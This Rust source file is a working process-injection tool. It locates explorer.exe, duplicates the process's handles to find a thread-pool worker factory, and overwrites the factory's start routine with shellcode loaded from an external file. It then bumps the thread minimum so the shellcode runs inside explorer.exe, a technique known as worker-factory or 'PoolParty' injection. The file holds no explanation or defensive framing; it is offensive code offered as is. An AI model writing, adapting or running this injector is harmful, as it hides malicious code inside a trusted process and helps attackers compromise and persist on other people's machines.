#![allow(non_snake_case)]
// use std::{os::raw::c_void, ptr::null_mut};
use ntapi::ntexapi::{
    NtQueryInformationWorkerFactory, NtSetInformationWorkerFactory,
    WORKER_FACTORY_BASIC_INFORMATION, WorkerFactoryBasicInformation, WorkerFactoryThreadMinimum,
};
use std::{ffi::c_void, ptr::null_mut};
use windows_sys::{
    Wdk::{
        Foundation::{NtQueryObject, ObjectTypeInformation},
        System::{
            SystemInformation::NtQuerySystemInformation,
            Threading::{NtQueryInformationProcess, ProcessHandleInformation},
        },
    },
    Win32::{
        Foundation::{
            CloseHandle, DUPLICATE_SAME_ACCESS, DuplicateHandle, STATUS_INFO_LENGTH_MISMATCH,
            UNICODE_STRING,
        },
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, VirtualAllocEx},
            Threading::{
                GetCurrentProcess, OpenProcess, PROCESS_DUP_HANDLE, PROCESS_QUERY_INFORMATION,
                PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
            },
            WindowsProgramming::SYSTEM_PROCESS_INFORMATION,
        },
    },
};

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");

#[repr(C)]
struct HandleEntry {
    handle_value: *mut c_void,
    granted_access: u32,
}

#[repr(C)]
pub struct ProcessHandleInfo {
    pub NumberOfHandles: usize,
    pub Handles: [HandleEntry; 1],
}

#[repr(C)]
pub struct GENERIC_MAPPING {
    pub GenericRead: u32,
    pub GenericWrite: u32,
    pub GenericExecute: u32,
    pub GenericAll: u32,
}

#[repr(C)]
pub struct OBJECT_TYPE_INFORMATION {
    pub TypeName: UNICODE_STRING,
    pub TotalNumberOfObjects: u32,
    pub TotalNumberOfHandles: u32,
    pub TotalPagedPoolUsage: u32,
    pub TotalNonPagedPoolUsage: u32,
    pub TotalNamePoolUsage: u32,
    pub TotalHandleTableUsage: u32,
    pub HighWaterNumberOfObjects: u32,
    pub HighWaterNumberOfHandles: u32,
    pub HighWaterPagedPoolUsage: u32,
    pub HighWaterNonPagedPoolUsage: u32,
    pub HighWaterNamePoolUsage: u32,
    pub HighWaterHandleTableUsage: u32,
    pub InvalidAttributes: u32,
    pub GenericMapping: GENERIC_MAPPING,
    pub ValidAccessMask: u32,
    pub SecurityRequired: u8,
    pub MaintainHandleCount: u8,
    pub TypeIndex: u8,
    pub ReservedByte: i8,
    pub PoolType: u32,
    pub DefaultPagedPoolCharge: u32,
    pub DefaultNonPagedPoolCharge: u32,
}

fn get_pid(proc_name: &str) -> u32 {
    let mut pid = 0;

    unsafe {
        let mut return_length = 0;
        let status = NtQuerySystemInformation(
            5, // SystemProcessInformation
            null_mut(),
            0,
            &mut return_length,
        );

        if status != STATUS_INFO_LENGTH_MISMATCH {
            println!(
                "[!] NtQuerySystemInformation failed with status: {}",
                status
            );
            return pid;
        }

        let buffer_size = return_length as usize;
        let mut buffer = vec![0u8; buffer_size];

        let status = NtQuerySystemInformation(
            5,
            buffer.as_mut_ptr() as *mut _,
            buffer_size as u32,
            &mut return_length,
        );

        if status != 0 {
            println!(
                "[!] NtQuerySystemInformation failed with status: {}",
                status
            );
            return pid;
        }

        let mut proc_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;

        loop {
            if !(*proc_info).ImageName.Buffer.is_null()
                && proc_name.eq_ignore_ascii_case(
                    &String::from_utf16_lossy(std::slice::from_raw_parts(
                        (*proc_info).ImageName.Buffer,
                        (*proc_info).ImageName.Length as usize / 2,
                    ))
                    .as_str(),
                )
            {
                pid = (*proc_info).UniqueProcessId as u32;
                break;
            }

            if (*proc_info).NextEntryOffset == 0 {
                break;
            }

            proc_info = (proc_info as *const u8).add(proc_info.read().NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }
    }

    pid
}

fn find_worker_handle(proc_handle: *mut c_void) -> *mut c_void {
    unsafe {
        let buffer_size = 1024 * 1024; // 1 MB
        let mut buffer = vec![0u8; buffer_size];
        let mut return_length = 0;

        let status = NtQueryInformationProcess(
            proc_handle,
            ProcessHandleInformation,
            buffer.as_mut_ptr() as *mut _,
            buffer_size as u32,
            &mut return_length,
        );

        if status != 0 {
            println!(
                "[!] NtQueryInformationProcess failed with status: {:X}",
                status
            );
            return null_mut();
        }

        let handle_info = buffer.as_ptr() as *const ProcessHandleInfo;
        let handles = std::slice::from_raw_parts(
            &(*handle_info).Handles as *const HandleEntry,
            (*handle_info).NumberOfHandles as usize,
        );
        println!("[+] Found {} handles in the target process", handles.len());

        for (i, handle) in handles.iter().enumerate() {
            let mut duplicated_handle = std::ptr::null_mut();

            if DuplicateHandle(
                proc_handle,
                handle.handle_value,
                GetCurrentProcess(),
                &mut duplicated_handle,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            ) == 0
            {
                continue;
            }

            let mut return_length = 0;
            let status = NtQueryObject(
                duplicated_handle,
                ObjectTypeInformation,
                null_mut(),
                0,
                &mut return_length,
            );

            if status != STATUS_INFO_LENGTH_MISMATCH {
                println!(
                    "[!] NtQueryObject failed for handle {:?}: {:X}",
                    handle.handle_value, status
                );
                continue;
            }

            let buffer_size = return_length as usize;
            let mut type_info_buffer = vec![0u8; buffer_size];

            let status = NtQueryObject(
                duplicated_handle,
                ObjectTypeInformation,
                type_info_buffer.as_mut_ptr() as *mut _,
                buffer_size as u32,
                &mut return_length,
            );

            if status != 0 {
                // println!(
                //     "[!] NtQueryObject failed for handle {:?}: {:X}",
                //     handle.handle_value, status
                // );
                CloseHandle(duplicated_handle);
                continue;
            }

            let type_info = type_info_buffer.as_ptr() as *const OBJECT_TYPE_INFORMATION;
            let type_name = std::slice::from_raw_parts(
                type_info.read().TypeName.Buffer,
                type_info.read().TypeName.Length as usize / 2,
            );

            if let Ok(name) = String::from_utf16(type_name) {
                if name == "TpWorkerFactory" {
                    println!(
                        "[+] Found TpWorkerFactory handle {:?} at index {}",
                        handle.handle_value, i
                    );
                    return duplicated_handle;
                }
            }
        }
    }

    null_mut()
}

fn main() {
    let proc_name = "explorer.exe";

    let pid = get_pid(proc_name);

    if pid == 0 {
        println!("[!] {} process not found", proc_name);
        return;
    }

    println!("[+] {} process found with PID: {}", proc_name, pid);

    unsafe {
        let proc_handle = OpenProcess(
            PROCESS_QUERY_INFORMATION
                | PROCESS_VM_READ
                | PROCESS_VM_WRITE
                | PROCESS_VM_OPERATION
                | PROCESS_DUP_HANDLE,
            0,
            pid,
        );

        if proc_handle.is_null() {
            println!("[!] Failed to open process with PID: {}", pid);
            return;
        }

        let remote_buffer = VirtualAllocEx(
            proc_handle,
            null_mut(),
            SHELLCODE.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READ,
        );

        if remote_buffer.is_null() {
            println!("[!] Failed to allocate memory in the target process");
            return;
        }

        println!(
            "[+] Allocated {} bytes at address: {:p}",
            SHELLCODE.len(),
            remote_buffer
        );

        // let mut bytes_written = 0;
        // if WriteProcessMemory(
        //     proc_handle,
        //     remote_buffer,
        //     SHELLCODE.as_ptr() as *const _,
        //     SHELLCODE.len(),
        //     &mut bytes_written,
        // ) == 0
        // {
        //     println!(
        //         "[!] Failed to write shellcode to the target process: {}",
        //         std::io::Error::last_os_error()
        //     );
        //     return;
        // }

        // println!("[+] Written {} bytes to the target process", bytes_written);

        let worker_handle = find_worker_handle(proc_handle);

        if worker_handle.is_null() {
            println!("[!] Failed to find a worker thread in the target process");
            return;
        }

        let mut basic_info: WORKER_FACTORY_BASIC_INFORMATION = std::mem::zeroed();

        let status = NtQueryInformationWorkerFactory(
            worker_handle as *mut _,
            WorkerFactoryBasicInformation, // WorkerFactoryBasicInformation
            &mut basic_info as *mut _ as *mut _,
            std::mem::size_of::<WORKER_FACTORY_BASIC_INFORMATION>() as u32,
            null_mut(),
        );

        if status != 0 {
            println!(
                "[!] NtQueryInformationWorkerFactory failed with status: {:X}",
                status
            );
            return;
        }

        let mut bytes_written = 0;
        if WriteProcessMemory(
            proc_handle,
            basic_info.StartRoutine as *mut _,
            SHELLCODE.as_ptr() as *const _,
            SHELLCODE.len(),
            &mut bytes_written,
        ) == 0
        {
            println!(
                "[!] Failed to write shellcode to the target process: {}",
                std::io::Error::last_os_error()
            );
            return;
        }

        let min_thread_count = basic_info.TotalWorkerCount + 1;

        let status = NtSetInformationWorkerFactory(
            worker_handle as *mut _,
            WorkerFactoryThreadMinimum,
            &min_thread_count as *const _ as *mut _,
            std::mem::size_of::<u32>() as u32,
        );

        if status != 0 {
            println!(
                "[!] NtSetInformationWorkerFactory failed with status: {:X}",
                status
            );
            return;
        }
    }
}
